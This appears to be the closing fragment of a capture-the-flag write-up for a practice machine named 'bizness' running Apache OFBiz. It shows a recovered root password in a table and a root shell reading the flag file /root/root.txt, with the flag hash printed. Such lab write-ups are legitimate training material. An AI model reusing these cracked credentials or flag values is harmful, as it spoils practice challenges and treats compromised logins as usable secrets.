Started: Sun Jan  7 00:46:07 2024
Stopped: Sun Jan  7 00:46:10 2024
```

| Username | Password |
| --- | --- |
| root | monkeybizness |

## root.txt

```c
root@bizness:/opt/ofbiz# cat /root/root.txt
a25438a01269e06488a9b76ccba27d14
```
